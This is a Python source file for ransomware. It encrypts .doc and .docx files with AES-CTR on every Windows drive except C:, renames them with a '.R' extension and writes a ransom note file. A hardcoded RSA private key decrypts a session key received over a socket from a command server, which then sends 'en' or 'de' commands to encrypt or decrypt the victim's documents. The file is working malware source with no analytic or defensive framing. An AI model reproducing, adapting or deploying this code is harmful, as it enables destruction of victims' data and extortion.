import os
import os.path
from Cryptodome.Cipher import AES
from Cryptodome import Random
from Cryptodome.Util import Counter
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import socket
import time


# encryption method AES_CTR mode
def encryption(key, file_name):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)
    if os.path.exists(file_name):
        with open(file_name, 'r+b') as f:
            block_size = 16
            plaintext = f.read(block_size)
            while plaintext:
                f.seek(-len(plaintext), 1)
                f.write(c.encrypt(plaintext))
                plaintext = f.read(block_size)
        os.rename(file_name, file_name + ".R")
    return [key]


# decryption method AES_CTR
def decryption(key, file_name):
    counter = Counter.new(128)
    d = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(file_name, 'r+b') as f:
        block_size = 16
        plaintext = f.read(block_size)
        while plaintext:
            f.seek(-len(plaintext), 1)
            f.write(d.decrypt(plaintext))
            plaintext = f.read(block_size)
    os.rename(file_name, file_name.strip(".R"))


# listing windows partitions
def partition_windows():
    p_list = []
    for p in range(65, 91):
        if chr(p)=='C':
            continue
        p = chr(p) + "://"
        if os.path.exists(p):
            p_list.append(p)
    return p_list

# listing the files
def dir_f_list_en(d,key):
    extensions = ['doc', 'docx']
    fd = []
    for d, sd, f in os.walk(d):
        for file_name in f:
            full_path = os.path.join(d, file_name)
            ex = full_path.split(".")[-1]
            if ex in extensions:
                encryption(key,full_path)
                f = open("Ransomwere.txt", "w")
                f.write(" your document files encrypted ")
                f.close()
                fd.append(full_path)

    return fd


def dir_f_list_de(d,key):
    extensions = ['R']
    fd = []
    for d, sd, f in os.walk(d):
        for file_name in f:
            full_path = os.path.join(d, file_name)
            ex = full_path.split(".")[-1]
            if ex in extensions:
                decryption(key,full_path)
                fd.append(full_path)

    return fd


# client to connection
def client():
    privkey = """-----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAooGyR6CC+cEuqR6621ntELnKqFyVbHUuVXIJbHAPA5NVwQUa
    QPDOXvEUEh8ZjWT/MzPnDa/2wVjnkcg/ABI2ZwXTSdxvwZhkml0a33t8p5QQXra5
    vIQQqQKMCmJhR2Eftovwz0oK6hepCbUqacI0JwdaJvZ8EXC9Z5PkUP6uKMldzHc1
    lKhmr6doImHvPsOx1O4ufgD9Id3TXaoDDOsNJS2BkHDp07TXdcCUAbPH70gBTeoq
    +tzT5vM3tTwchxhYdbgz67NGm44qOfVYGqhyGFgXBRCopVjONAlMfKs6R5EoYa7r
    QPgyP+YxUkGAYPvl69saGMqrRAlYylOlk0TxvwIDAQABAoIBAE/4WT5sW+gCTC8H
    o1asoz/23icKILJV3C5KRx7o6kqNJ8cr9qZ8mmIYaxMb4Nw3FmshIJQYwuqVEKgq
    De7AB6udL0QKyahQkTlxlfbicw6Yi5HAhBikOPqi+T1m+o5A2nVf2mp3+nUGnbXc
    RHn1Cusl8BR6ecWvYFXnbpT5L8V7wdKH9Y/RQqaqfsfhaaX1zsO3JyAwR9KwLmK1
    8Xzi+dFnXRQNtGEVICOrxTsFYuigASZrTHvYEjWtl2AHj1Fu9Tt0Al17q7ChWg/Y
    qO9+E75+Kygeh5lh6mKgmvqV1qUqIDr1dMit4GTIKh6KTLdPZnwCiyUQzNZljcaj
    LPdMhfkCgYEAw3y2e0qhArWH16Haztfy8AMLWI8JV3O9Mj0p5BQU7e0dsLtXzRaR
    kP19eCAa/VHkIhLvDDVWYlXZhTM0qeGBNV3VMVgp9JF3CerEdg5IXII2tRh9nrZh
    1zcKf2Kr9Owi37/+pNoeXYdPTWL97tqthiMYSw3V4AXSN/+kHSMnB3UCgYEA1M90
    +BwsiRIYF2y8ziffnmXETOreRzCJWfVC0PYWFiq9pf03lvlHLQfriFoiaqGvZLdK
    UNd51ot1TmqClU2VHZjdeplUpvZ/6iwh1bQ19PUzjgYe2TJJ3EYBt6sLfkNFJ7iX
    aHo2t8BCwlIV4HXp7oBia2lSDBfA/08QUCG+YeMCgYAFC0O+HKfY5QwzQSbfLW1E
    Sh/R0icAjaj1EeTx0J7VoMeiVsMmNI3e+ttw7QslPCaxxmFKpFmtQd/R8wdJ1tq5
    oMkuc8LpX5N9uwQEs8ukL2vv8kjTfos5vV7U+JvNPwaLVW3hnQspiKNAMOyybAwM
    KP2oehvpotzQuxTl95E7PQKBgAtDs/BSJXVX9NiAk/nhmG+c+WgM4pkoE40kc1X2
    QLMJriI0JhYiucbDbY85HitAxbTyEsf2r+dQWHQ/JQxcH/GCHu8XYKi50YmGrn/O
    WzDNLd5tqoJarBgxyHN9ZU1YqDdzCOip122giqgYijnoY+qQ9ySyXXpwY3HgMH/d
    WWN7AoGBALf3hZZ6wdSAImzb3aV5DC0vfjjrpKFANqhlv1h6aee8JXjQNHf1xzFN
    Qwz4ER0zO3wGvv+pLu05ifFwZVN5r97cIBwlWVDo3Ifg/b6cDGfcj8OPnnUsAUdL
    HGzBwSi6W7in13QrCgdF8QLPMAelMc1soGQm9ULIwirFznOB/z7S
    -----END RSA PRIVATE KEY-----"""
    privkey = privkey.encode('ascii')
    privkey_ = RSA.importKey(privkey)
    de_key = PKCS1_OAEP.new(privkey_)
    port = 4545
    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        key_data_enc = s.recv(2048)
        decrypted_key = de_key.decrypt(key_data_enc)
        key = decrypted_key.decode('ascii')
        padding = lambda data_key: data_key + (16 - len(data_key) % 16) * "*"
        key = padding(key).encode('ascii')
        s.send(b'\n the key is saved\n')
        while True:
            command = s.recv(2048)
            command = command.decode('ascii')
            files_ = []
            if command == "en":
                parts = partition_windows()
                for part in parts:
                    files = dir_f_list_en(part, key)
                s.send(b'\ndone\n')
            if command == "de":
                parts = partition_windows()
                for part in parts:
                    files = dir_f_list_de(part, key)
                s.send(b'\ndone\n')
    except socket.error as e:
        print("trying to connect with server with in 60 sec")
        time.sleep(60)
        s.close()
        client()


client()

